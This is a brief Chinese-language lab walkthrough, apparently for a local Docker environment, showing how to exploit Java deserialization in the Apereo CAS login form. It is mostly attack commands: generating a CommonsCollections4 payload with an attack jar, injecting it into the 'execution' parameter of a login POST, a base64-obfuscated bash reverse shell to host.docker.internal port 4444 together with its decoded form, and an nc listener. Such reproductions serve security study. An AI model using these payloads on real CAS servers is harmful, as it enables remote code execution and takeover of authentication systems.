```
docker compose up -d
```
打开登录页面：
```
http:/localhost:18080/cas/login
```
使用ysoserial的CommonsCollections4生成加密后的Payload：
```
cd /tools
/usr/bin/java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 "touch /tmp/success"
```

```
POST /cas/login HTTP/1.1

username=test&password=test&lt=LT-2-gs2epe7hUYofoq0gI21Cf6WZqMiJyj-cas01.example.org&execution=[payload]&_eventId=submit&submit=LOGIN
```

```
/usr/bin/java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9ob3N0LmRvY2tlci5pbnRlcm5hbC80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}
```

```
YmFzaCAtaSA+JiAvZGV2L3RjcC9ob3N0LmRvY2tlci5pbnRlcm5hbC80NDQ0IDA+JjE=
```
为
```
bash -i >& /dev/tcp/host.docker.internal/4444 0>&1
```

将编码放进Body中的`execution`
开启监听：
```
nc -lv 4444
```
然后登录即可反弹shell
